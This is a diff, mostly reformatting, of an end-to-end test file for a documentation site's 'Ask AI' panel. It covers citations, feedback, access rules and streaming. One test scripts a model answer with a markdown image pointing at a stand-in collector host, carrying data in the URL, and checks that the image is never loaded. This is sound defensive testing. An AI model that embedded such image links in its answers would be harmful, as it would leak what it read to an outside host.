@@ -17,7 +17,10 @@ const ROOT = resolve(import.meta.dirname, "../..");
 
 type Scripted = ModelTurn | "hang" | Error;
 const say = (text: string): ModelTurn => ({ text, calls: [] });
-const look = (name: string, input: unknown): ModelTurn => ({ text: "Let me look that up.", calls: [{ id: `${name}-1`, name, input }] });
+const look = (name: string, input: unknown): ModelTurn => ({
+  text: "Let me look that up.",
+  calls: [{ id: `${name}-1`, name, input }]
+});
 
 pandocsDescribe("asking the documents, and telling them what was wrong", () => {
   let app: Awaited<ReturnType<typeof startPandocs>>;
@@ -31,7 +34,8 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
     return {
       async turn({ onText }) {
         const next = script.shift() ?? say("I do not know.");
-        if (next === "hang") await new Promise((_, reject) => signal.addEventListener("abort", () => reject(new Error("stopped"))));
+        if (next === "hang")
+          await new Promise((_, reject) => signal.addEventListener("abort", () => reject(new Error("stopped"))));
         if (next instanceof Error) throw next;
         const turn = next as ModelTurn;
         for (const word of turn.text.split(/(?<= )/u)) {
@@ -53,11 +57,21 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
   };
 
   beforeAll(async () => {
-    app = await startPandocs(postgres.getConnectionString(), { llm: { complete: async () => "", assist: async () => "", conversation } });
+    app = await startPandocs(postgres.getConnectionString(), {
+      llm: { complete: async () => "", assist: async () => "", conversation }
+    });
     await app.api("admin", "POST", "spaces", { slug: SPACE, name: "Guide", defaultRole: "viewer" });
     await app.api("admin", "PUT", `spaces/${SPACE}/members`, { subject: "user:e2e-editor", role: "editor" });
-    await app.api("editor", "POST", `spaces/${SPACE}/documents`, { title: "Returns", slug: "returns", markdown: "# Returns\n\nWithin seven days.\n\n## Refunds\n\nOn the original card.\n" });
-    await app.api("editor", "POST", `spaces/${SPACE}/documents`, { title: "Shipping", slug: "shipping", markdown: "# Shipping\n\nTakes a week.\n" });
+    await app.api("editor", "POST", `spaces/${SPACE}/documents`, {
+      title: "Returns",
+      slug: "returns",
+      markdown: "# Returns\n\nWithin seven days.\n\n## Refunds\n\nOn the original card.\n"
+    });
+    await app.api("editor", "POST", `spaces/${SPACE}/documents`, {
+      title: "Shipping",
+      slug: "shipping",
+      markdown: "# Shipping\n\nTakes a week.\n"
+    });
   }, 120_000);
 
   afterAll(async () => {
@@ -66,7 +80,11 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
 
   it("looks things up where it can be seen, answers as it goes, and links what it cites to the page", async () => {
     // The page being read is the first source, the page found the second, and the section it reads the third.
-    scripts.set("How do refunds work?", [look("search_pages", { query: "refund" }), look("read_page", { source: 2, section: "refunds" }), say("Refunds go **on the original card** [3]. Allow a week [3].")]);
+    scripts.set("How do refunds work?", [
+      look("search_pages", { query: "refund" }),
+      look("read_page", { source: 2, section: "refunds" }),
+      say("Refunds go **on the original card** [3]. Allow a week [3].")
+    ]);
     const page = await app.open("reader", `/${SPACE}/shipping`, ENGLISH);
     await question(page, "How do refunds work?");
     await browserExpect(panel(page).getByText("Searched for “refund”")).toBeVisible();
@@ -77,8 +95,12 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
     const citation = panel(page).locator(".pd-ask__cite a").first();
     await browserExpect(citation).toHaveText("1");
     await browserExpect(citation).toHaveAttribute("href", /\/guide\/returns#refunds$/u);
-    await browserExpect(panel(page).getByRole("list", { name: "Sources" }).getByRole("link", { name: "Returns: Refunds" })).toBeVisible();
-    await page.evaluate(() => { (window as unknown as { stayed: boolean }).stayed = true; });
+    await browserExpect(
+      panel(page).getByRole("list", { name: "Sources" }).getByRole("link", { name: "Returns: Refunds" })
+    ).toBeVisible();
+    await page.evaluate(() => {
+      (window as unknown as { stayed: boolean }).stayed = true;
+    });
     await citation.click();
     await browserExpect(page.locator("main").getByText("On the original card.")).toBeVisible();
     // The app moved, with the conversation still next to it.
@@ -117,10 +139,16 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
   }, 60_000);
 
   it("shows no picture an answer tries to load, which could carry what it read somewhere else", async () => {
-    scripts.set("Leak it", [say("Here you go ![secret](https://collector.example.test/leak.png?data=seven) and [a link](https://example.test/page).")]);
+    scripts.set("Leak it", [
+      say(
+        "Here you go ![secret](https://collector.example.test/leak.png?data=seven) and [a link](https://example.test/page)."
+      )
+    ]);
     const page = await app.open("reader", `/${SPACE}/returns`, ENGLISH);
     const requests: string[] = [];
-    page.on("request", request => { if (request.url().includes("example.test")) requests.push(request.url()); });
+    page.on("request", request => {
+      if (request.url().includes("example.test")) requests.push(request.url());
+    });
     await question(page, "Leak it");
     await browserExpect(panel(page).getByRole("link", { name: "a link" })).toBeVisible();
     await browserExpect(panel(page).locator("img")).toHaveCount(0);
@@ -151,7 +179,10 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
     const page = await app.open("commenter", `/${SPACE}/returns`, ENGLISH);
     await page.getByRole("button", { name: "Ask AI", exact: true }).click();
     await browserExpect(panel(page)).toBeVisible();
-    await page.getByRole("button", { name: /^Comments?\b/u }).first().click();
+    await page
+      .getByRole("button", { name: /^Comments?\b/u })
+      .first()
+      .click();
     await browserExpect(panel(page)).toHaveCount(0);
     await browserExpect(page.locator(".pd-panel")).toHaveCount(1);
     await page.getByRole("button", { name: "Ask AI", exact: true }).click();
@@ -171,7 +202,9 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
     await feedback.getByRole("button", { name: "Send" }).click();
     await browserExpect(feedback.getByText("Thanks for telling us.")).toBeVisible();
     await page.reload();
-    await browserExpect(page.locator(".pd-page-feedback").getByText("Thanks for telling us.")).toBeVisible({ timeout: 15_000 });
+    await browserExpect(page.locator(".pd-page-feedback").getByText("Thanks for telling us.")).toBeVisible({
+      timeout: 15_000
+    });
     // Not on the tools for a page.
     await page.goto(`${app.origin}/${SPACE}/returns?view=source`);
     await browserExpect(page.getByText("Markdown source", { exact: false })).toBeVisible({ timeout: 15_000 });
@@ -204,21 +237,29 @@ pandocsDescribe("asking the documents, and telling them what was wrong", () => {
     await said.getByRole("button", { name: "Mark as dealt with" }).click();
     await browserExpect(said).toHaveCount(0);
     await page.getByRole("button", { name: "Dealt with" }).click();
-    await browserExpect(page.locator(".pd-feedback").filter({ hasText: "It does not say where to send things." })).toBeVisible();
+    await browserExpect(
+      page.locator(".pd-feedback").filter({ hasText: "It does not say where to send things." })
+    ).toBeVisible();
     await page.context().close();
   }, 60_000);
 
   it("gets what was said in front of whoever wrote the page", async () => {
     const page = await app.open("editor", "/_/inbox", ENGLISH);
     await browserExpect(page.getByText("gave feedback", { exact: false }).first()).toBeVisible({ timeout: 15_000 });
-    await browserExpect(page.getByText("It does not say where to send things.", { exact: false }).first()).toBeVisible();
+    await browserExpect(
+      page.getByText("It does not say where to send things.", { exact: false }).first()
+    ).toBeVisible();
     await page.context().close();
   }, 60_000);
 
   it("is not offered to someone whose site has no model", async () => {
     const plain = await startPandocs(postgres.getConnectionString());
     await plain.api("admin", "POST", "spaces", { slug: SPACE, name: "Guide", defaultRole: "viewer" });
-    await plain.api("admin", "POST", `spaces/${SPACE}/documents`, { title: "Page", slug: "page", markdown: "Words.\n" });
+    await plain.api("admin", "POST", `spaces/${SPACE}/documents`, {
+      title: "Page",
+      slug: "page",
+      markdown: "Words.\n"
+    });
     const page = await plain.open("reader", `/${SPACE}/page`, ENGLISH);
     await browserExpect(page.getByText("Words.")).toBeVisible({ timeout: 15_000 });
     await browserExpect(page.getByRole("button", { name: "Ask AI", exact: true })).toHaveCount(0);
@@ -248,12 +289,31 @@ pandocsDescribe("asking on a public site", () => {
         received.push(body);
         response.writeHead(200, { "content-type": "text/event-stream" });
         if (!body.messages.some(message => message.role === "tool")) {
-          response.end(chunk({ choices: [{ delta: { tool_calls: [{ index: 0, id: "call_1", function: { name: "search_pages", arguments: "{\"query\":\"seven days\"}" } }] }, finish_reason: "tool_calls" }] }) + "data: [DONE]\n\n");
+          response.end(
+            chunk({
+              choices: [
+                {
+                  delta: {
+                    tool_calls: [
+                      {
+                        index: 0,
+                        id: "call_1",
+                        function: { name: "search_pages", arguments: '{"query":"seven days"}' }
+                      }
+                    ]
+                  },
+                  finish_reason: "tool_calls"
+                }
+              ]
+            }) + "data: [DONE]\n\n"
+          );
           return;
         }
         response.write(chunk({ choices: [{ delta: { content: "Within seven days " } }] }));
         setTimeout(() => {
-          response.end(chunk({ choices: [{ delta: { content: "[1]." }, finish_reason: "stop" }] }) + "data: [DONE]\n\n");
+          response.end(
+            chunk({ choices: [{ delta: { content: "[1]." }, finish_reason: "stop" }] }) + "data: [DONE]\n\n"
+          );
         }, 800);
       });
     });
@@ -273,8 +333,17 @@ pandocsDescribe("asking on a public site", () => {
       });
     });
     await admin.json("POST", "/api/v1/spaces", { slug: "shop", name: "Shop", defaultRole: "none" });
-    await admin.json("POST", "/api/v1/spaces/shop/documents", { title: "Returns", slug: "returns", markdown: "Within seven days of delivery.\n" });
-    await admin.json("POST", "/api/v1/spaces/shop/documents", { title: "Secret", slug: "secret", markdown: "Within seven days of delivery we pay nothing.\n", restricted: true });
+    await admin.json("POST", "/api/v1/spaces/shop/documents", {
+      title: "Returns",
+      slug: "returns",
+      markdown: "Within seven days of delivery.\n"
+    });
+    await admin.json("POST", "/api/v1/spaces/shop/documents", {
+      title: "Secret",
+      slug: "secret",
+      markdown: "Within seven days of delivery we pay nothing.\n",
+      restricted: true
+    });
     await admin.json("PATCH", "/api/v1/spaces/shop", { publicRead: true });
     browser = await launchBrowser();
   }, 240_000);
@@ -297,9 +366,15 @@ pandocsDescribe("asking on a public site", () => {
   it("is closed to visitors until the site opens it, and offers to sign in for it", async () => {
     const page = await openAsVisitor();
     await page.getByRole("button", { name: "Ask AI", exact: true }).click();
-    await browserExpect(page.getByRole("dialog", { name: "Sign in" }).getByText("Sign in to ask the AI about these documents.")).toBeVisible();
+    await browserExpect(
+      page.getByRole("dialog", { name: "Sign in" }).getByText("Sign in to ask the AI about these documents.")
+    ).toBeVisible();
     await browserExpect(page.getByRole("complementary", { name: "Ask AI" })).toHaveCount(0);
-    const answer = await fetch(`${origin}/api/v1/ask`, { method: "POST", headers: { "content-type": "application/json" }, body: "{\"question\":\"?\"}" });
+    const answer = await fetch(`${origin}/api/v1/ask`, {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: '{"question":"?"}'
+    });
     expect(answer.status).toBe(403);
     expect(((await answer.json()) as { error: { code: string } }).error.code).toBe("ASK_CLOSED");
     await page.context().close();
@@ -308,8 +383,24 @@ pandocsDescribe("asking on a public site", () => {
 
   it("comes back piece by piece, through everything in between", async () => {
     // Visitors share the list of what the site offers for a few seconds.
-    await expect.poll(async () => (await fetch(`${origin}/api/v1/ask`, { method: "POST", headers: { "content-type": "application/json" }, body: "{\"question\":\"?\"}" })).status, { timeout: 15_000, interval: 1000 }).toBe(200);
-    const response = await fetch(`${origin}/api/v1/ask`, { method: "POST", headers: { "content-type": "application/json", "accept-encoding": "gzip, br" }, body: "{\"question\":\"How long?\"}" });
+    await expect
+      .poll(
+        async () =>
+          (
+            await fetch(`${origin}/api/v1/ask`, {
+              method: "POST",
+              headers: { "content-type": "application/json" },
+              body: '{"question":"?"}'
+            })
+          ).status,
+        { timeout: 15_000, interval: 1000 }
+      )
+      .toBe(200);
+    const response = await fetch(`${origin}/api/v1/ask`, {
+      method: "POST",
+      headers: { "content-type": "application/json", "accept-encoding": "gzip, br" },
+      body: '{"question":"How long?"}'
+    });
     expect(response.headers.get("content-type")).toContain("text/event-stream");
     expect(response.headers.get("content-encoding")).toBeNull();
     const reader = response.body!.getReader();
@@ -324,7 +415,7 @@ pandocsDescribe("asking on a public site", () => {
     }
     const finishedAt = Date.now();
     expect(finishedAt - firstWordsAt).toBeGreaterThan(400);
-    expect(text).toContain("\"type\":\"done\"");
+    expect(text).toContain('"type":"done"');
     expect(text).toContain("/shop/returns");
     expect(text).not.toContain("/shop/secret");
     // What went to the model is what a visitor can read.
@@ -336,22 +427,37 @@ pandocsDescribe("asking on a public site", () => {
 
   it("answers a visitor in the page, cited, with no errors along the way", async () => {
     // What the site offers visitors is shared for a few seconds. Until then their button asks them to sign in, and is no toggle.
-    await expect.poll(async () => /class="pd-ask-button"[^>]*aria-pressed/u.test(await (await fetch(`${origin}/shop/returns`, { headers: { "accept-language": "en" } })).text()), { timeout: 15_000, interval: 1000 }).toBe(true);
+    await expect
+      .poll(
+        async () =>
+          /class="pd-ask-button"[^>]*aria-pressed/u.test(
+            await (await fetch(`${origin}/shop/returns`, { headers: { "accept-language": "en" } })).text()
+          ),
+        { timeout: 15_000, interval: 1000 }
+      )
+      .toBe(true);
     const page = await openAsVisitor();
     const problems: string[] = [];
     page.on("pageerror", error => problems.push(error.message));
-    page.on("console", message => { if (message.type() === "error" && !message.text().includes("401")) problems.push(message.text()); });
+    page.on("console", message => {
+      if (message.type() === "error" && !message.text().includes("401")) problems.push(message.text());
+    });
     await page.getByRole("button", { name: "Ask AI", exact: true }).click();
     const panel = page.getByRole("complementary", { name: "Ask AI" });
     await panel.getByRole("textbox", { name: "Ask a question" }).fill("How long do I have?");
     await panel.getByRole("button", { name: "Send" }).click();
-    await browserExpect(panel.locator(".pd-ask__cite a")).toHaveAttribute("href", /\/shop\/returns$/u, { timeout: 15_000 });
+    await browserExpect(panel.locator(".pd-ask__cite a")).toHaveAttribute("href", /\/shop\/returns$/u, {
+      timeout: 15_000
+    });
     await panel.getByRole("button", { name: "This helped" }).click();
     await browserExpect(panel.getByRole("button", { name: "This helped" })).toHaveAttribute("aria-pressed", "true");
     expect(problems).toEqual([]);
     await page.context().close();
     const { data } = await admin.json("GET", "/api/v1/spaces/shop/insights");
-    expect(data.questions.find((row: { question: string }) => row.question === "How long do I have?")).toMatchObject({ answered: true, helpful: true });
+    expect(data.questions.find((row: { question: string }) => row.question === "How long do I have?")).toMatchObject({
+      answered: true,
+      helpful: true
+    });
     // A visitor's reading counted, without anything saying who.
     expect(data.pages.find((row: { title: string }) => row.title === "Returns").people).toBeGreaterThan(0);
   }, 60_000);
